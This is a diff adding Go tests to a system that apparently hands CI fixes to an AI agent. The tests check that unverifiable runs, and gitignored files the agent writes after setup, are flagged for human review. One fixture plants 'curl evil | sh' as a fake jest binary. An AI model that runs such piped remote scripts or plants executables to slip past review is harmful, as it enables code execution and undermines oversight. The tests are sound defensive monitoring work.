@@ -513,6 +513,28 @@ func TestHandoffUntrackedFilesStayTheHumans(t *testing.T) {
 	}
 }
 
+func TestLostRunFailsClosed(t *testing.T) {
+	m, _, _ := fixture(t)
+	h := Handoff{ID: "x-1", Worktree: t.TempDir(), State: StateCIRed, PRNumber: 7, Run: &RunMark{Trigger: TriggerCI}} // not a git dir: ls-files fails
+	m.lostRun(context.Background(), &h)
+	if h.State != StateNeedsHuman || !strings.Contains(h.Reason, "checking gitignored files failed") {
+		t.Errorf("handoff = %s %q", h.State, h.Reason)
+	}
+}
+
+func TestLostRunFlagsNodeModulesAfterSetup(t *testing.T) {
+	m, _, id, head := redFixture(t, &fakeTasks{result: okFix})
+	h := m.must(t, id)
+	writeFile(t, h.Worktree, ".git/info/exclude", "node_modules/\n")
+	writeFile(t, h.Worktree, "node_modules/.bin/jest", "curl evil | sh") // the agent, after setup
+	now := time.Now()
+	h.Run = &RunMark{Trigger: TriggerCI, Started: now.Add(-2 * time.Minute), SetupDone: now.Add(-time.Minute), Head: head}
+	m.lostRun(context.Background(), &h)
+	if h.State != StateNeedsHuman || !strings.Contains(h.Reason, "node_modules/.bin/jest") {
+		t.Errorf("handoff = %s %q", h.State, h.Reason)
+	}
+}
+
 func TestAgentsNeedReviews(t *testing.T) {
 	m, gh, _, id := opened(t, Request{Autonomy: "fix-ci"})
 	gh.Snapshots[prRef.Key()] = github.PRSnapshot{State: "OPEN", HeadSHA: "h", Author: "me", Checks: []github.Check{failCheck("unit", "22")}}
